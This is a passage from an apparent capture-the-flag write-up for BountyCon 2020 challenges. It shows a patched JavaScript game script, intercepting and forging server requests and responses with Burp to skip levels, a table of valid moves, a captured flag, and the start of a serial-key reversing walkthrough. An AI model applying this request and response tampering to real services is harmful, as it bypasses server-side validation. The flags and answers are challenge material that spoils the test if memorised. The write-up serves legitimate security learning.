                <span class="k">if</span> <span class="p">(</span><span class="nx">Z</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">6</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">ah</span><span class="p">[</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]].</span><span class="nx">classList</span><span class="p">.</span><span class="nx">contains</span><span class="p">(</span><span class="s2">"t"</span><span class="p">))</span> <span class="p">{</span>
                    <span class="nx">ah</span><span class="p">[</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]].</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">"t"</span><span class="p">);</span>
                    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">bb</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">bb</span> <span class="o">&lt;</span> <span class="nx">O</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">bb</span><span class="o">++</span><span class="p">)</span>
                        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">bc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">bc</span> <span class="o">&lt;</span> <span class="nx">O</span><span class="p">[</span><span class="nx">bb</span><span class="p">].</span><span class="nx">length</span><span class="p">;</span> <span class="nx">bc</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                            <span class="k">if</span> <span class="p">(</span><span class="nx">O</span><span class="p">[</span><span class="nx">bb</span><span class="p">][</span><span class="nx">bc</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">7</span> <span class="o">&amp;&amp;</span> <span class="nx">O</span><span class="p">[</span><span class="nx">bb</span><span class="p">][</span><span class="nx">bc</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="nx">Z</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">ah</span><span class="p">[</span><span class="nx">bb</span><span class="p">][</span><span class="nx">bc</span><span class="p">].</span><span class="nx">classList</span><span class="p">.</span><span class="nx">contains</span><span class="p">(</span><span class="s2">"t"</span><span class="p">))</span> <span class="p">{</span>
                                <span class="nx">ah</span><span class="p">[</span><span class="nx">bb</span><span class="p">][</span><span class="nx">bc</span><span class="p">].</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">"t"</span><span class="p">);</span>
                                <span class="nx">V</span><span class="p">[</span><span class="nx">bb</span><span class="p">][</span><span class="nx">bc</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nx">requestAnimationFrame</span><span class="p">(</span><span class="nx">ax</span><span class="p">);</span>
    <span class="p">},</span>
    <span class="nx">bd</span> <span class="o">=</span> <span class="p">(</span><span class="nx">be</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">am</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nx">am</span><span class="o">--</span><span class="p">;</span>
        <span class="nx">energybar</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="p">((</span><span class="mi">1</span> <span class="o">-</span> <span class="nx">am</span> <span class="o">/</span> <span class="nx">O</span><span class="p">[</span><span class="s2">"e"</span><span class="p">])</span> <span class="o">*</span> <span class="mi">304</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"px"</span><span class="p">;</span>
        <span class="nx">energybar</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">am</span> <span class="p">?</span> <span class="s2">" "</span> <span class="o">+</span> <span class="nx">am</span> <span class="o">+</span> <span class="s2">"/"</span> <span class="o">+</span> <span class="nx">O</span><span class="p">[</span><span class="s2">"e"</span><span class="p">]</span> <span class="p">:</span> <span class="s2">" out of energy"</span><span class="p">;</span>
        <span class="nx">ao</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">be</span><span class="p">);</span>
        <span class="c1">// 4. when a move is made, log current move and all moves to console</span>
        <span class="c1">// `ao` is the moves array</span>
        <span class="c1">// `be` is the current move</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'move'</span><span class="p">,</span> <span class="nx">be</span><span class="p">,</span> <span class="nx">ao</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">''</span><span class="p">))</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">};</span>
<span class="nx">au</span><span class="p">();</span>
<span class="nx">ax</span><span class="p">();</span>
<span class="p">[</span>
    <span class="p">[</span><span class="nx">c_jl</span><span class="p">,</span> <span class="nx">_</span> <span class="o">=&gt;</span> <span class="nx">ap</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">an</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">am</span> <span class="o">&amp;&amp;</span> <span class="nx">V</span><span class="p">[</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">][</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">aj</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">"m"</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">aq</span><span class="p">(</span><span class="nx">ay</span> <span class="o">=&gt;</span> <span class="nx">aj</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">top</span> <span class="o">=</span> <span class="p">((</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="nx">ay</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="s2">"px"</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="nx">V</span><span class="p">[</span><span class="o">--</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">||</span> <span class="p">(</span><span class="nx">bd</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nx">aq</span><span class="p">(</span><span class="nx">ay</span> <span class="o">=&gt;</span> <span class="nx">aj</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">left</span> <span class="o">=</span> <span class="p">((</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="nx">ay</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="s2">"px"</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="nx">V</span><span class="p">[</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="o">--</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">||</span> <span class="p">(</span><span class="nx">bd</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">V</span><span class="p">[</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">][</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">||</span> <span class="p">(</span><span class="nx">bd</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nx">aq</span><span class="p">(</span><span class="nx">ay</span> <span class="o">=&gt;</span> <span class="nx">aj</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">left</span> <span class="o">=</span> <span class="p">((</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="nx">ay</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="s2">"px"</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="nx">bd</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">--</span><span class="p">))))],</span>
    <span class="p">[</span><span class="nx">c_u</span><span class="p">,</span> <span class="nx">_</span> <span class="o">=&gt;</span> <span class="nx">ap</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">an</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">V</span><span class="p">[</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">][</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">&amp;&amp;</span> <span class="nx">bd</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">aq</span><span class="p">(</span><span class="nx">ay</span> <span class="o">=&gt;</span> <span class="nx">aj</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">top</span> <span class="o">=</span> <span class="p">((</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="nx">ay</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="s2">"px"</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">--</span><span class="p">)],</span>
    <span class="p">[</span><span class="nx">c_jr</span><span class="p">,</span> <span class="nx">_</span> <span class="o">=&gt;</span> <span class="nx">ap</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">an</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">am</span> <span class="o">&amp;&amp;</span> <span class="nx">V</span><span class="p">[</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">][</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">aj</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s2">"m"</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">aq</span><span class="p">(</span><span class="nx">ay</span> <span class="o">=&gt;</span> <span class="nx">aj</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">top</span> <span class="o">=</span> <span class="p">((</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="nx">ay</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="s2">"px"</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="nx">V</span><span class="p">[</span><span class="o">--</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">||</span> <span class="p">(</span><span class="nx">bd</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nx">aq</span><span class="p">(</span><span class="nx">ay</span> <span class="o">=&gt;</span> <span class="nx">aj</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">left</span> <span class="o">=</span> <span class="p">((</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">ay</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="s2">"px"</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="nx">V</span><span class="p">[</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="o">++</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">||</span> <span class="p">(</span><span class="nx">bd</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">V</span><span class="p">[</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">][</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">||</span> <span class="p">(</span><span class="nx">bd</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nx">aq</span><span class="p">(</span><span class="nx">ay</span> <span class="o">=&gt;</span> <span class="nx">aj</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">left</span> <span class="o">=</span> <span class="p">((</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">ay</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="s2">"px"</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="nx">bd</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span> <span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">++</span><span class="p">))))],</span>
    <span class="p">[</span><span class="nx">c_l</span><span class="p">,</span> <span class="nx">_</span> <span class="o">=&gt;</span> <span class="nx">ap</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">an</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">V</span><span class="p">[</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">bd</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">aj</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">"m"</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">aq</span><span class="p">(</span><span class="nx">ay</span> <span class="o">=&gt;</span> <span class="nx">aj</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">left</span> <span class="o">=</span> <span class="p">((</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="nx">ay</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="s2">"px"</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">--</span><span class="p">)],</span>
    <span class="p">[</span><span class="nx">c_p</span><span class="p">,</span> <span class="nx">_</span> <span class="o">=&gt;</span> <span class="nx">ap</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">an</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">aj</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">toggle</span><span class="p">(</span><span class="s2">"m"</span><span class="p">)],</span>
    <span class="p">[</span><span class="nx">c_r</span><span class="p">,</span> <span class="nx">_</span> <span class="o">=&gt;</span> <span class="nx">ap</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">an</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">V</span><span class="p">[</span><span class="nx">ai</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">bd</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">aj</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s2">"m"</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">aq</span><span class="p">(</span><span class="nx">ay</span> <span class="o">=&gt;</span> <span class="nx">aj</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">left</span> <span class="o">=</span> <span class="p">((</span><span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">ay</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="s2">"px"</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">ai</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">++</span><span class="p">)],</span>
    <span class="p">[</span><span class="nx">c_re</span><span class="p">,</span> <span class="nx">_</span> <span class="o">=&gt;</span> <span class="nx">au</span><span class="p">(</span><span class="nx">ab</span><span class="p">)],</span>
    <span class="p">[</span><span class="nx">c_d</span><span class="p">,</span> <span class="nx">_</span> <span class="o">=&gt;</span> <span class="nx">ap</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">an</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">aj</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">"j"</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">aq</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{},</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">aj</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s2">"j"</span><span class="p">))]</span>
<span class="p">].</span><span class="nx">map</span><span class="p">(</span><span class="nx">bf</span> <span class="o">=&gt;</span> <span class="nx">bf</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">"click"</span><span class="p">,</span> <span class="nx">bf</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
<span class="c1">// };</span>
</code></pre></div></div>

<p>1. This enables you to copy the edited code and paste it in your console for it to take effect. This is not the best way to make changes to a script.</p>



<p>2 &amp; 3. This makes sure when <code class="highlighter-rouge">window.hack</code> is true, you can make any move (instead of having to go to the flag square) and a request will be sent to the server to validate the moves made so far.</p>



<p>4. This logs the current move and all moves made so far in that level to the console.</p>



<p>Copy the above code and paste it in the console of the challenge webpage. Now the patched game will be running. When you make any move, it'll be logged to the console along with all the moves made so far (the moves array <code class="highlighter-rouge">ao</code>). This moves array is eventually sent to the server for validating if you have actually solved the level or not. The server returns a part of the final level (which has the flag) in the response when you correctly solve a level.</p>



<p>Make any random moves and observe the output in the console, you'll be able to link the moves to numbers:</p>



<table>
  <tbody>
    <tr>
      <td>2</td>
      <td>Up</td>
    </tr>
    <tr>
      <td>5</td>
      <td>Left</td>
    </tr>
    <tr>
      <td>6</td>
      <td>Right</td>
    </tr>
    <tr>
      <td>0</td>
      <td>Jump Up and Move Left Twice</td>
    </tr>
    <tr>
      <td>1</td>
      <td>Jump Up and Move Left Once</td>
    </tr>
    <tr>
      <td>4</td>
      <td>Jump Up and Move Right Twice</td>
    </tr>
    <tr>
      <td>3</td>
      <td>Jump Up and Move Right Once</td>
    </tr>
  </tbody>
</table>

<p>Go to the square where you need to jump up and move one square. You can solve the level by starting either from the right side or the left side. This is from the right side:
<img src="/--/bountycon20/pog/level6-partial.png" alt="Proof-of-Game Level 6 Partial" /></p>



<p>In the console, you'll see the move array is <code class="highlighter-rouge">66655</code> or <code class="highlighter-rouge">55566</code>. You can now predict the next two moves by visualizing and using the table above, construct the final moves array: <code class="highlighter-rouge">6665515</code> or <code class="highlighter-rouge">5556631</code></p>



<p>Initially, I brute forced the moves for this level using <a href="https://portswigger.net/burp">Burp</a> (energy bar showed 7 moves were available so I sent moves starting 0000000 to 6666666 which is 7^7 = 823,543 requests) and only later read the source and figured all this out.</p>



<p>Here are the valid moves for all levels:</p>



<table>
  <tbody>
    <tr>
      <td>Level 1</td>
      <td>666555</td>
    </tr>
    <tr>
      <td>Level 2</td>
      <td>644466300000</td>
    </tr>
    <tr>
      <td>Level 3</td>
      <td>6333</td>
    </tr>
    <tr>
      <td>Level 4</td>
      <td>552512550666666666</td>
    </tr>
    <tr>
      <td>Level 5</td>
      <td>06443644</td>
    </tr>
    <tr>
      <td>Level 6</td>
      <td>5556631 or 6665515</td>
    </tr>
  </tbody>
</table>

<p>You need a way to send the modified moves to the server. For this you can either patch the code, set a breakpoint in developer tools when the request is sent, or simply intercept the request using a proxy like <a href="https://portswigger.net/burp">Burp</a>.</p>



<p>In Burp, you can add the IP address of the challenge URL to the interception rules to make sure there's no noise when intercepting requests/responses:</p>



<p><img src="/--/bountycon20/pog/burp-proxy-config.png" alt="Proof-of-Game Burp Config" /></p>



<p>Make sure to also enable interception for server responses which will be required for the next level.</p>



<p>Once your proxy is setup, enter <code class="highlighter-rouge">window.hack = true</code> in the console and make any move. This will trigger the server request even though you're not on the flag square yet. The request will look something like this:</p>



<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /pog/p.php HTTP/1.1
Host: 178.128.95.74
Connection: close
Content-Length: 222
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Accept: */*
Origin: https://178.128.95.74
Referer: https://178.128.95.74/pog/
Accept-Encoding: gzip, deflate

------WebKitFormBoundary
Content-Disposition: form-data; name="l"

5
------WebKitFormBoundary
Content-Disposition: form-data; name="p"

$MOVES_ARRAY$
------WebKitFormBoundary--
</code></pre></div></div>

<p><code class="highlighter-rouge">l</code> is the level (starting from zero) and <code class="highlighter-rouge">p</code> is the moves array. Change <code class="highlighter-rouge">p</code> to the modified moves array for this level (<code class="highlighter-rouge">6665515</code> or <code class="highlighter-rouge">5556631</code>). The server should return a success response.</p>



<p>Game should move on to Level 7, which says "literally unplayable" and "so close":
<img src="/--/bountycon20/pog/level7.png" alt="Proof-of-Game Level 7" /></p>



<p>Using the above table, you might think sending <code class="highlighter-rouge">22</code> (up and up) as moves should solve it, but it won't.</p>



<p>At this point I had no clues on what to do and I was curious about what's on the next level, so I thought of just checking it out.</p>



<p><code class="highlighter-rouge">window.hack</code> is already set to true, so just make any move to trigger sending the request again. Forward the request without making any changes. When the server responds, change the failure response to a success repsonse. You can take any success response from the previous levels.</p>



<p>Change</p>


<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="s2">"s"</span><span class="p">:</span><span class="mi">0</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>to</p>


<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="s2">"s"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="s2">"k"</span><span class="p">:[]}</span><span class="w">
</span></code></pre></div></div>

<p>The <code class="highlighter-rouge">k</code> array is not empty in the other success responses but it doesn't matter what the contents are, it just needs to exist.</p>



<p><img src="/--/bountycon20/pog/burp-server-response-intercept.png" alt="Proof-of-Game Server Response Interception" /></p>



<p>You'll now be on the final level and see something that resembles a "B":</p>



<p><img src="/--/bountycon20/pog/level8-orig.png" alt="Proof-of-Game Level 8" /></p>



<p>Expand the game board to see what it says.</p>



<p>Run these in the console or manually edit the styles in dev tools:</p>


<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">'main'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">margin</span> <span class="o">=</span> <span class="s1">'0'</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">'#overlay'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="s1">'none'</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">'#a'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="s1">'3000px'</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">'#a'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="s1">'1000px'</span>
</code></pre></div></div>

<p>You'll finally see the flag:</p>



<p><img src="/--/bountycon20/pog/level8-mod.png" alt="Proof-of-Game Flag" /></p>



<blockquote>
  <p>BountyCon{b0r1ngggAm3}</p>


</blockquote>

<p>I expected this to give me a partial flag since I didn't solve the previous level. This challenge makes you switch tactics for different levels and it's quite surprising when you finally get the flag.</p>



<h3 id="aglet--reversing--published-dec-31">aglet â Reversing â published Dec 31</h3>

<blockquote>
  <p>Showing messages in text is boring. We made this program to show messages with pretty colours but â¦ we lost the serial key!</p>



  <p><a href="/--/bountycon20/attachments/aglet.tar.gz">aglet.tar.gz</a></p>


</blockquote>

<p><img src="/--/bountycon20/aglet/ferbs-aglet.jpg" alt="Ferb's Aglet" /></p>



<p>aglet is the most difficult and least solved challenge here. It took me a long time and what I describe here is likely not the optimal way to do it.</p>



<p>You'll need to have access to a Linux environment for running the binary. My primary OS is macOS so I had to use a VM. First I used <a href="https://www.virtualbox.org/">VirtualBox</a> but it was laggy so I ended up using <a href="https://www.qemu.org/">QEMU</a>.</p>



<p>Run <code class="highlighter-rouge">aglet</code> directly in a terminal. It'll fail with an error if you don't have <a href="https://launchpad.net/ubuntu/+source/libsdl2">libsdl2</a> installed. Once you install <a href="https://www.libsdl.org/">SDL</a> and rerun it, it'll ask you for a serial key:</p>


<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>usage: ./aglet &lt;serial key&gt;
  you *do* have a license for this software
  don't you?
</code></pre></div></div>

<p>The serial key format it wants is pretty common and you can guess it or figure it out by reverse engineering it.</p>



<p>Open the aglet binary in <a href="https://www.ghidra-sre.org/">Ghidra</a> and try understanding parts of the code. You can skip what you don't understand and come back to it later, I skipped all the bitwise operations.</p>



<p>The serial key format is <code class="highlighter-rouge">????-????-????-????</code>. <code class="highlighter-rouge">XXXX-XXXX-XXXX-XXXX</code> is a valid key and so is <code class="highlighter-rouge">AAAA-AAAA-AAAA-AAAA</code>. There are 32 whitelisted characters that can appear in the serial: <code class="highlighter-rouge">FACE20TW3NY1456789DGHJKLMPQRSUXZ</code>. There are some additional validations that are done on the serial so any serial composed of whitelisted characters isn't valid. Brute force would require testing 32^16 serials.</p>



<p><img src="/--/bountycon20/aglet/X16-A.png" alt="aglet XXXX-XXXX-XXXX-XXXX A" />
<img src="/--/bountycon20/aglet/X16-B.png" alt="aglet XXXX-XXXX-XXXX-XXXX B" /></p>



